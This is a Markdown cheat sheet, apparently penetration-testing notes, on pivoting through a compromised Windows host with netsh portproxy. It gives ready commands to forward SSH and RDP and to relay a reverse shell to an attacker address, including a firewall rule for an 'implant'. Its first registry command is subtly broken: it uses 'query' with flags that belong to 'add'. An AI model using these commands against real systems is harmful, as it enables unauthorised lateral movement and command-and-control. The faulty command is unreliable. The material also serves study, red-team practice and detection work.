# Living off the Land

## 01 - Conditions

Packet forwarding must be enabled.

```
C:\> reg.exe query [\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 0x1 /f
```

```
PS C:\> Set-NetIPInterface -Forwarding Enabled
```

Both services of `IP Helper` and **IPv6 support** must be enabled. To ensure they're enabled here are the following commands:

```
C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\iphlpsvc" /v Start /t REG_DWORD /d 2 /f

C:\> sc.exe [\\<IP>] config iphlpsvc start= auto

C:\> net.exe start "IP Helper"

C:\> sc.exe [\\<IP>] start iphlpsvc
```

## 02 - Usage

> [!NOTE] Elevated Privileges is Required
> `netsh interface portproxy` must be executed with administrative rights.

```
C:\> netsh.exe interface portproxy add <v4tov4 | v4tov6 | v6tov4 | v6tov6> listenport=<LPORT> listenaddress=<LHOST> connectport=<FPORT> connectaddress=<FHOST>
```

Display port forwarding rules.

```
C:\> netsh.exe interface portproxy show <all | v4tov4 | v4tov6 | v6tov4 | v6tov6>
```

Delete port forwarding rule.

```
C:\> netsh.exe interface portproxy delete v4tov4 listenaddress=<LHOST> listenport=<LPORT>
```

Flush port forwarding rules.

```
C:\> netsh.exe interface portproxy reset [ipv4 | ipv6]
```

## 03 - Scenarios

### 3.1 - Bind SSH Port

Grab the SSH port number

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=4242 listenaddress=<pivot_IP | 0.0.0.0> connectport=22 connectaddress=192.168.0.101
```

In command prompt

```
C:\> netstat.exe -anp TCP | find "4242"

C:\> tasklist.exe | findstr :4242
```

In powershell

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 4242
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward SSH" protocol=tcp dir=in localip=<pivot_IP> localport=4242 action=allow
```

Remotely authenticate SSH server

```
$ ssh <username>@<pivot_IP> -p 4242
```

### 3.2 - Bind RDP Port

Grab the RDP port number

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<pivot_IP | 0.0.0.0> connectport=3389 connectaddress=<RDP_IP>
```

In command prompt

```
C:\> netstat.exe -na | findstr "8080"

C:\> tasklist.exe | findstr :8080
```

In powershell

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 8080
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward RDP" protocol=tcp dir=in localip=<pivot_IP> localport=8080 action=allow
```

Remotely authenticate RDP server

```
$ xfreerdp /v:<pivot_IP>:8080 /u:<username> /p:<password> /sec:<rdp | tls | nla>
```

### 3.3 - Remote Port Forwarding Reverse Shells

Port forward the reverse shell handler.

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=8443 connectaddress=<attacker_IP>
```

Check for 8443 listening port in command prompt.

```
C:\> netstat.exe -na | findstr "8443"

C:\> tasklist.exe | findstr :8443
```

Check for 8443 listening port in powershell.

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 8443
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward Implant" protocol=tcp dir=in localip=<compromised_pivot_IP> localport=8443 action=allow
```

Then you can launch a reverse shell handler with any C2 frameworks. Just specify the compromised system's IP and PORT.

---
## References

- [Netsh Interface PortProxy](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy)

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)

- [PayloadsAllTheThings Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

- [How to Redirect a Port Using Netsh Interface PortProxy Command in Windows](https://www.computertechblog.com/how-to-redirect-a-port-using-netsh-interface-portproxy-command-in-windows/)

- [Configure Port Forwarding on Windows Using Netsh](https://bobcares.com/blog/configure-port-forwarding-on-windows-using-netsh/)

- [Windows Port Forward](https://embracethered.com/blog/posts/2020/windows-port-forward/)

- [Shell is coming: Metasploit Chain of Proxies](https://www.shelliscoming.com/2013/08/metasploit-chain-of-proxies-with.html)

### Similar to Linux

- [[Rinetd]]

### Scenarios

- [Metasploit: Portproxy (tunneling meterpreter session inside another meterpreter session) + socat + chisel](https://pswalia2u.medium.com/metasploit-portproxy-tunneling-meterpreter-session-inside-another-meterpreter-session-9a99bcf959ac)

- [Metasploit: Portproxy (tunneling meterpreter session inside another meterpreter session) + socat + chisel (web archived)](https://web.archive.org/web/20221121115128/https://pswalia2u.medium.com/metasploit-portproxy-tunneling-meterpreter-session-inside-another-meterpreter-session-9a99bcf959ac)

- [CyberSec Wikimandine: Port Forwarding with Windows Netsh](https://amandinegh.gitbook.io/cyberadventure/internal/pivoting-tunneling-and-port-forwarding/port-forwarding-with-windows-netsh)

### Detections

- [DFIR Notes: PortProxy Detection](https://www.dfirnotes.net/portproxy_detection/)